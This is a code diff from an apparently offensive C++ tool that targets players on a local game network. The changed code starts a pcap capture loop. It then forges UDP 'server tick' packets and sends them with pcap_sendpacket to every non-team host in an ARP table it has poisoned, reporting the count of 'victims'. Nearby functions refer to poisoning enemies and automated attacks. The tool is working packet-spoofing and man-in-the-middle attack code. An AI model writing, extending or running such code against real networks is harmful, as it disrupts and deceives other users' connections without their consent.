@@ -46,20 +46,18 @@ void CommandManager::Respawn(std::string message) {
 }
 
 void CommandManager::Device(std::string message) {
-  SelectDevice();
-}
+  // Break the network scanner loop.
+  if (pcap_in_loop) {
+    pcap_breakloop(pcap);
+    pcap_in_loop = false;
+  }
 
-void CommandManager::Scan(std::string message) {
-  FetchMacs(server_ip);
-}
+  // Select the device.
+  if (!SelectDevice()) {
+    return;
+  }
 
-void CommandManager::CollectIds(std::string message) {
-  // Poison enemies towards us
-  PoisonEnemies(message);
-
-  // Send server tick packet (1 enemy @ bottom left)
-
-  // Retrieve IDs from move packets
+  // Begin the network scanner loop.
   u_int netmask = 0xFFFFFF; // We're in a C class network.
   char packet_filter[] = "ip and udp";
   struct bpf_program filter_code;
@@ -76,6 +74,51 @@ void CommandManager::CollectIds(std::string message) {
   }
 
   pcap_loop(pcap, 0, PacketHandler, (u_char*)NULL);
+  pcap_in_loop = true;
+}
+
+void CommandManager::Scan(std::string message) {
+  FetchMacs(server_ip);
+}
+
+void CommandManager::CollectIds(std::string message) {
+  // Send server tick packet (1 enemy @ middle)
+  if (pcap == NULL) {
+    std::cout << "You must first choose a valid device" << std::endl;
+    return;
+  }
+
+  char payload[512];
+  const u_short header_length = sizeof(struct UdpHeader) +
+                                sizeof(struct Ipv4Header) +
+                                sizeof(struct EthernetHeader);
+
+  int i = 0;
+
+  for (auto& it : enemy_arp_table) {
+    if (IsTeamIp(std::string(it.first))) {
+      continue;
+    }
+
+    sprintf_s(payload, "1,1,1,1,0|500,500,10,10,0", i);
+    u_int length = strlen(payload);
+    u_char* packet = (u_char*) malloc(length + header_length);
+    u_char* message = packet + header_length;
+    memcpy(message, payload, length);
+
+    WriteUdp(length, packet, server_port, client_port, it.second,
+             server_mac, strdup(server_ip.c_str()), it.first);
+
+    if (pcap_sendpacket(pcap, packet, length + header_length) != 0) {
+      std::cout << "Error sending packet: " << pcap_geterr(pcap) << std::endl;
+      return;
+    }
+
+    free(packet);
+    i++;
+  }
+
+  std::cout << "Sent server packet to " << i << " victims" << std::endl;
 }
 
 void CommandManager::AutomatedAttack(std::string message) {
